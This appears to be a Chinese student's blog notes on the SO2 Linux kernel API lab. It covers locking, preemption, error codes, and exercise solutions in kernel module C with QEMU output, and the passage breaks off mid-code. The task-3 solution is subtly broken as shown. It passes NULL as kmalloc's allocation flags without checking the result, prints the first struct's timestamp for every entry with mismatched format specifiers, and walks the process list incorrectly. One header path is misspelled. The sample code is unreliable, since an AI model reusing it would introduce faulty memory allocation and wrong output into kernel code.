<p>某些内核 API 调用可能会阻止当前进程（例如使用信号量或等待条件变量），在这种情况下，进程将进入等待队列，并且让另一个进程运行</p>
<p><strong>Locking</strong></p>
<p>内核编程最重要的特性之一是并行性，Linux 支持具有多个处理器和内核抢占性的 SMP 系统</p>
<p>这使得内核编程更加困难，因为对全局变量的访问必须与自旋锁基元  spinlock primitives 或阻塞基元 blocking primitives 同步：</p>
<ul>
<li>在受自旋锁保护的关键区域中运行的代码，不允许挂起当前进程</li>
<li>当进程开始自旋时，其占用的 CPU 资源也不会释放</li>
<li>因此，尽可能少使用自旋锁</li>
</ul>
<p><strong>Preemptivity</strong></p>
<p>Linux 使用抢占式内核</p>
<p>抢占式多任务处理的概念是指：操作系统在其量程（时间片）到期时，强制中断在用户空间中运行的进程，以便运行另一个进程</p>
<ul>
<li>由于抢占性，当我们需要从不同进程上下文中运行的两部分代码之间共享资源时，我们需要使用 synchronization primitives 同步基元来保护自己，即使在单个处理器的情况下也是如此</li>
</ul>
<p><strong>Convention indicating errors</strong></p>
<p>对于 Linux 内核编程，用于调用函数以指示成功的约定与在 UNIX 编程中相同：</p>
<ul>
<li>0 表示成功，或 0 以外的值表示失败（返回负值）</li>
</ul>
<p>详尽的错误列表和摘要解释可以在 <code>include/asm-generic/errno-base.h</code> 和 <code>includes/asm-generic/ernno.h</code></p>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=kernel_api make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  kernel_api git:(master) ✗ ls</span><br><span class="line">1-mem  2-sched-spin  3-memory  4-list  5-list-full  6-list-sync  7-list-test</span><br></pre></td></tr></table></figure>
<p>1.Memory allocation in Linux kernel：</p>
<ul>
<li>观察调用 <code>kmalloc()</code> 对内存的分配情况</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel API lab</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * mem.c - Memory allocation in Linux</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Print memory&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">mem_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> i;</span><br><span class="line"></span><br><span class="line">	mem = kmalloc(<span class="number">4096</span> * <span class="keyword">sizeof</span>(*mem), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (mem == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_mem;</span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;chars: &quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4096</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">isalpha</span>(mem[i]))</span><br><span class="line">			printk(KERN_CONT <span class="string">&quot;%c &quot;</span>, mem[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	pr_info(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_mem:</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mem_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	kfree(mem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mem_init);</span><br><span class="line">module_exit(mem_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果如下：（<code>printk</code> 默认换行，可以使用 KERN_CONT 禁止换行）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mem: loading out-of-tree <span class="keyword">module</span> taints kernel.                                  </span><br><span class="line">chars: Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z  </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br></pre></td></tr></table></figure>
<p>2.Sleeping in atomic context：</p>
<ul>
<li>熟悉自旋锁的使用：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel API lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * sched-spin.c: Sleeping in atomic context</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Sleep while atomic&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sched_spin_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">spinlock_t</span> lock;</span><br><span class="line"></span><br><span class="line">	spin_lock_init(&amp;lock);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 0: Use spin_lock to aquire the lock */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	<span class="comment">/* Try to sleep for 5 seconds. */</span></span><br><span class="line">	schedule_timeout(<span class="number">5</span> * HZ);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 0: Use spin_unlock to release the lock */</span></span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sched_spin_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(sched_spin_init);</span><br><span class="line">module_exit(sched_spin_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>加载内核模块时报出了 <code>scheduling while atomic</code> 这个错误，说是会污染内核（当内核受到污染意味着内核处于社区不支持的状态）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">2</span>-sched-spin<span class="meta"># insmod sched-spin.ko              </span></span><br><span class="line">sched_spin: loading out-of-tree <span class="keyword">module</span> taints kernel.                           </span><br><span class="line">BUG: scheduling <span class="keyword">while</span> atomic: insmod/<span class="number">239</span>/<span class="number">0x00000002</span>                             </span><br><span class="line"><span class="number">1</span> lock held by insmod/<span class="number">239</span>:                                                      </span><br><span class="line"> #<span class="number">0</span>: c585bdb8 (&amp;lock)&#123;+.+.&#125;-&#123;<span class="number">2</span>:<span class="number">2</span>&#125;, at: sched_spin_init+<span class="number">0x32</span>/<span class="number">0x90</span> [sched_spin]   </span><br><span class="line">Modules linked in: sched_spin(O+)                                               </span><br><span class="line">CPU: <span class="number">0</span> PID: <span class="number">239</span> Comm: insmod Tainted: G           O      <span class="number">5.10</span><span class="number">.14</span>+ #<span class="number">3</span>            </span><br><span class="line">Hardware name: <span class="function">QEMU Standard <span class="title">PC</span> <span class="params">(i440FX + PIIX, <span class="number">1996</span>)</span>, BIOS 1.13.0-1ubuntu1.1 04</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在错误消息中按照包含 BUG 的说明：不能在原子操作中 sleep（自旋锁是用原子操作实现的）</li>
</ul>
<p>3.Working with kernel memory：</p>
<ul>
<li>为结构体 <code>struct task_info</code> 分配内存并初始化其字段</li>
<li>为当前进程、父进程、下一进程、下一进程的下一进程分配结构体 <code>struct task_info</code></li>
<li>显示四个结构</li>
<li>释放结构占用的内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 lab3 - task 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Memory processing&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti1</span>, *<span class="title">ti2</span>, *<span class="title">ti3</span>, *<span class="title">ti4</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_alloc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: allocated and initialize a task_info struct */</span></span><br><span class="line">	ti = (struct task_info*)kmalloc(<span class="keyword">sizeof</span>(struct task_info),<span class="literal">NULL</span>);</span><br><span class="line">	ti-&gt;pid = pid;</span><br><span class="line">	ti-&gt;timestamp = jiffies;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memory_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 2: call task_info_alloc for current pid */</span></span><br><span class="line">	p = current;</span><br><span class="line">	ti1 = task_info_alloc(p-&gt;pid);</span><br><span class="line">	<span class="comment">/* TODO 2: call task_info_alloc for parent PID */</span></span><br><span class="line">	p = current-&gt;parent;</span><br><span class="line">	ti2 = task_info_alloc(p-&gt;pid);</span><br><span class="line">	<span class="comment">/* TODO 2: call task_info alloc for next process PID */</span></span><br><span class="line">	p = next_task(p);</span><br><span class="line">	ti3 = task_info_alloc(p-&gt;pid);</span><br><span class="line">	<span class="comment">/* TODO 2: call task_info_alloc for next process of the next process */</span></span><br><span class="line">	p = next_task(next_task(p));</span><br><span class="line">	ti4 = task_info_alloc(p-&gt;pid);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">memory_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 3: print ti* field values */</span></span><br><span class="line">	printk(<span class="string">&quot;%d:%d&quot;</span>,ti1-&gt;pid,ti1-&gt;timestamp);</span><br><span class="line">	printk(<span class="string">&quot;%d:%d&quot;</span>,ti2-&gt;pid,ti1-&gt;timestamp);</span><br><span class="line">	printk(<span class="string">&quot;%d:%d&quot;</span>,ti3-&gt;pid,ti1-&gt;timestamp);</span><br><span class="line">	printk(<span class="string">&quot;%d:%d&quot;</span>,ti4-&gt;pid,ti1-&gt;timestamp);</span><br><span class="line">	<span class="comment">/* TODO 4: free ti* structures */</span></span><br><span class="line">	kfree(ti1);</span><br><span class="line">	kfree(ti2);</span><br><span class="line">	kfree(ti3);</span><br><span class="line">	kfree(ti4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(memory_init);</span><br><span class="line">module_exit(memory_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">3</span>-memory<span class="meta"># insmod memory.ko                      </span></span><br><span class="line">memory: loading out-of-tree <span class="keyword">module</span> taints kernel.                               </span><br><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">3</span>-memory<span class="meta"># rmmod memory.ko                       </span></span><br><span class="line"><span class="number">237</span>:<span class="number">-48258</span>                                                                      </span><br><span class="line"><span class="number">213</span>:<span class="number">-48258</span>                                                                      </span><br><span class="line"><span class="number">214</span>:<span class="number">-48258</span>         </span><br></pre></td></tr></table></figure>
<p>4.Working with kernel lists：</p>
<ul>
<li>熟悉 Linux 链表的使用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel API lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * list.c: Working with lists</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Use list to process task info&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_alloc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = kmalloc(<span class="keyword">sizeof</span>(*ti), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (ti == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	ti-&gt;pid = pid;</span><br><span class="line">	ti-&gt;timestamp = jiffies;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_to_list</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Allocate task_info and add it to list */</span></span><br><span class="line">	ti = task_info_alloc(pid);</span><br><span class="line">	list_add(&amp;ti-&gt;<span class="built_in">list</span>,&amp;head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_for_current</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* Add current, parent, next and next of next to the list */</span></span><br><span class="line">	task_info_add_to_list(current-&gt;pid);</span><br><span class="line">	task_info_add_to_list(current-&gt;parent-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(current)-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(next_task(current))-&gt;pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_print_list</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;%s: [ &quot;</span>, msg);</span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		pr_info(<span class="string">&quot;(%d, %lu) &quot;</span>, ti-&gt;pid, ti-&gt;timestamp);</span><br><span class="line">	&#125;</span><br><span class="line">	pr_info(<span class="string">&quot;]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_purge_list</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">tmp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: Iterate over the list and delete all elements */</span></span><br><span class="line">	list_for_each_safe(p, tmp, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		list_del(p);</span><br><span class="line">		kfree(ti);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">list_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	INIT_LIST_HEAD(&amp;head);</span><br><span class="line">	task_info_add_for_current();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	task_info_print_list(<span class="string">&quot;before 